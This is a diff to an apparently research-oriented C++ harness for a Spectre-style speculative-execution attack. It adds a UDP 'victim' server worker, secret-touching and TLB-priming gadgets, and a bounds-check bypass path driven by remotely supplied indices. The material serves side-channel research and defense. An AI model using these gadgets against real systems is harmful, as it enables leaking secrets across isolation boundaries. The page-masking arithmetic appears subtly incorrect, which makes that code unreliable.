@@ -51,11 +51,10 @@ uint16_t udp_port = 7777;
 /********************************************************************
 Victim private globals.
 ********************************************************************/
-size_t array1_size = 16;
+size_t array1_size = 16;  // current valid range (could also be dynamic)
 uint8_t unused1[64];
 uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
 uint8_t unused2[64];
-//uint8_t array2[256 * 512];
 
 constexpr size_t MAX_BUF_LENGTH = 4096;
 // Contiguous, nearby secret in static-globals section:
@@ -184,7 +183,10 @@ void print_config() {
   /* Print information about vulnerable items */
   std::cout << "sizeof(size_t): " << sizeof(size_t) << " bytes." << std::endl;
   printf("array1 (%ld bytes) at VA: 0x%lX\n", sizeof(array1), (size_t)array1);
-  printf("array2 (%ld bytes) at VA: 0x%lX\n", sizeof(region::array2), (size_t)array2);
+  printf("array1_size (%ld bytes) at VA: 0x%lX\n",
+         sizeof(array1_size), (size_t)(&array1_size));
+  printf("array2 (%ld bytes) at VA: 0x%lX\n",
+         sizeof(region::array2), (size_t)array2);
 }
 
 
@@ -200,7 +202,7 @@ void parse_args(int argc, char* const argv[]) {
     switch (c) {
     case 'h':
       std::cout << argv[0]
-          << "[-p udp_port] [-t]"
+          << " [-p udp_port] [-t]"
           << std::endl;
       exit(EXIT_SUCCESS);
       break;
@@ -268,13 +270,36 @@ inline void flush_condition() {
 
 
 inline bool touch_secret(size_t i = 0) {
-  return (secret_global[i] == secret_heap[i] &&
-          secret_global[i] == secret_stack[i]);
+  constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
+  volatile static uint8_t tmp;
+
+  // Fill TLB with entry correspoding to each secret:
+  // -- side effect: pulls first cache line of each page into cache.
+  const uint8_t* page1 = reinterpret_cast<uint8_t*>(
+        ( (size_t)(&secret_heap[i]) ) & (1-PAGE_SIZE) );
+  const uint8_t* page2 = reinterpret_cast<uint8_t*>(
+        ( (size_t)(&secret_global[i]) ) & (1-PAGE_SIZE) );
+  const uint8_t* page3 = reinterpret_cast<uint8_t*>(
+        ( (size_t)(&secret_stack[i]) ) & (1-PAGE_SIZE) );
+  tmp ^= *page1 ^ *page2 ^ *page3;
+  return tmp == 0;  // unsued return
+}
+
+
+inline bool touch_page(size_t va) {
+  constexpr size_t PAGE_SIZE = 1<<12; // Assume 4KB page size (minimim)
+  volatile static uint8_t tmp;
+
+  // Fill TLB with entry correspoding to va:
+  // -- side effect: pulls first cache line of page into cache.
+  const uint8_t* page = reinterpret_cast<uint8_t*>(va & (1-PAGE_SIZE));
+  tmp ^= *page;
+  return tmp == 0;  // unsued return
 }
 
 
 void helper(size_t malicious_x, size_t training_x = 0) {
-  volatile bool equal = touch_secret(); // ensures secret is cached (optional?)
+  touch_secret(); // ensures secret is cached (optional?)
 
   /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
   for (int j = 29; j >= 0; j--) {
@@ -296,13 +321,12 @@ void helper(size_t malicious_x, size_t training_x = 0) {
 
 
 void helper_simple(size_t x) {
-  volatile bool equal = touch_secret(); // ensures secret is cached (optional?)
-  flush_condition();  // ensures speculation occurs (optional?)
+//  touch_secret(); // ensures secret is cached (optional?)
+  flush_condition();  // Critical to allow speculation!
 
   /* Call the victim function! */
   victim_function(x);
 }
-
 
 
 void recv_worker(uint16_t port) {
@@ -322,7 +346,6 @@ void recv_worker(uint16_t port) {
       auto x = m.x;
       Request fn = m.fn;
 
-//#define DEBUG
 #ifdef DEBUG
       std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
       std::cout << "x=" << x << std::endl;
@@ -348,6 +371,62 @@ void recv_worker(uint16_t port) {
 }
 
 
+void recv_worker_v2(uint16_t port) {
+  uint8_t pkt_buf[2048];
+
+  SocketUDP s;
+  s.open(port);
+
+  std::cout << "["<<port<<"] - Receive worker thread listening." << std::endl;
+
+  for (;;) {
+    auto bytes = s.recv(pkt_buf, sizeof(pkt_buf));
+    if (bytes == sizeof(msg)) {
+      msg& m = reinterpret_cast<msg&>(pkt_buf);
+      auto x = m.x;
+      Request fn = m.fn;
+
+#ifdef DEBUG
+      std::cout << "["<<port<<"]- Received msg of " << bytes << " bytes.\n";
+#endif
+
+      switch (fn) {
+      case FN_NULL:
+      case FN_PROCESS:
+#ifdef DEBUG
+        std::cout << "Calling helper_simple("<<x<<")" << std::endl;
+#endif
+        helper_simple(x);
+        break;
+      case FN_EVICT_CONDITION:
+        std::cout << "Emulating gadget: flush_condition()" << std::endl;
+        flush_condition();
+        break;
+      case FN_TOUCH_SECRET:
+        std::cout << "Emulating gadget: touch_secret("<<x<<")" << std::endl;
+        touch_secret(x);
+        break;
+      case FN_TOUCH_VA:
+        std::cout << "Emulating gadget: touch_page("<<x<<")" << std::endl;
+        touch_page(x);
+        break;
+      default:
+        std::cerr << "Unexpected operation requested: " << fn << std::endl;
+      }
+
+      // Echo back message:
+      // - more realistically, helper would return data or condition code...
+      s.send(&m, sizeof(m));
+    }
+    else {
+      std::cerr << "["<<port<<"]- Received an unexpected" << bytes << "...\n";
+      return;
+    }
+  }
+}
+
+
+
 
 /********************************************************************
 Main.
@@ -365,20 +444,21 @@ int main(int argc, char* const argv[]) {
   print_config();
   parse_args(argc, argv);
 
-  // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
-  // only CPU i as set.
+  // Create a cpu_set_t object representing a set of CPUs
+  // - Pin worker thread to same cpu as attacker (for now)
   cpu_set_t cpuset;
   CPU_ZERO(&cpuset);
   CPU_SET(1, &cpuset);
 
   // Setup receive thread to imitate server:
-  std::thread t(recv_worker, udp_port);
+  std::thread t(recv_worker_v2, udp_port);
   int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
   }
 
-  std::this_thread::sleep_for(std::chrono::seconds(1));
+  // Simply sufficient time for threads to start before prompting user:
+  std::this_thread::sleep_for(std::chrono::milliseconds(100));
 
   // Loop forever, allowing user to enter new secrets:
   for (;;) {
